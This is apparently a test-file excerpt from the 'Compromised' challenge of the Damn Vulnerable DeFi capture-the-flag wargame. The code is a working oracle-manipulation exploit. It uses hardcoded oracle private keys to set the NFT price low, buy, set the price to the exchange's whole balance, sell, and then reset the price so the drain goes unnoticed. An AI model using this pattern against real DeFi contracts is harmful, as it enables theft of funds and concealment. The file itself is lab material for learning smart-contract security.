...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        const firstKey = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
        const secondKey = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"

        const firstOracle = new ethers.Wallet(firstKey, ethers.provider)
        const secondOracle = new ethers.Wallet(secondKey, ethers.provider)
        
        console.log("firstOracle=" + firstOracle.address)
        console.log("secondOracle=" + secondOracle.address)

        // Henryk: Set the price to be really low
        const lowPrice = ethers.utils.parseEther("0.01");
        await oracle.connect(firstOracle).postPrice("DVNFT", lowPrice);
        await oracle.connect(secondOracle).postPrice("DVNFT", lowPrice);

        expect(await oracle.connect(player).getMedianPrice("DVNFT")).to.eq(lowPrice)

        await exchange.connect(player).buyOne({ value: lowPrice });

        // Henryk: Set the price of the NFT to be the entire balance of the exchange so you 
        // can sell it back for EVERYTHING
        const highPrice = await ethers.provider.getBalance(exchange.address);
        await oracle.connect(firstOracle).postPrice("DVNFT", highPrice);
        await oracle.connect(secondOracle).postPrice("DVNFT", highPrice);

        expect(await oracle.connect(player).getMedianPrice("DVNFT")).to.eq(highPrice)

        // Henryk: make sure to approve() because the exchange smart contract will do a transferFrom
        // Henryk: I also assume the id is "0" since we only minted 1 NFT in the test
        await nftToken.connect(player).approve(exchange.address, 0);
        await exchange.connect(player).sellOne(0);

        // Henryk: set the price back to the original price so no one would be the wiser
        // that something happened
        await oracle.connect(firstOracle).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await oracle.connect(secondOracle).postPrice("DVNFT", INITIAL_NFT_PRICE);

        expect(await oracle.connect(player).getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE)
    });
